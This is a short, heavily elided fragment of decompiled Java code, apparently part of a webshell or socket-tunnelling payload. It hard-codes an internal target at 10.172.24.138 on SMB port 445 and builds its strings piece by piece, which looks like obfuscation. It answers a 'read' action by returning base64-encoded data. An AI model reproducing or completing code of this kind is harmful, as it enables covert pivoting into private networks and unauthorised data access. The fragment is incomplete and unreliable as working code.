...
public class Clsmymakqb {
    ...
    public Clsmymakqb() {
        ...
        targetIP = "";
        targetIP = targetIP + "10.172.24.138";
        targetPort = "";
        targetPort = targetPort + "445";
        socketHash = "";
        socketHash = socketHash + "f52fc4e25d1806d9";
    }
        ...
        block15: {
            ...
            block14: {
                ...
                if (action.equals("read")) {
                    ...
                    result.put("status", "success");
                    result.put("msg", Clsmymakqb.base64encode(data));
                    break block14;
                }
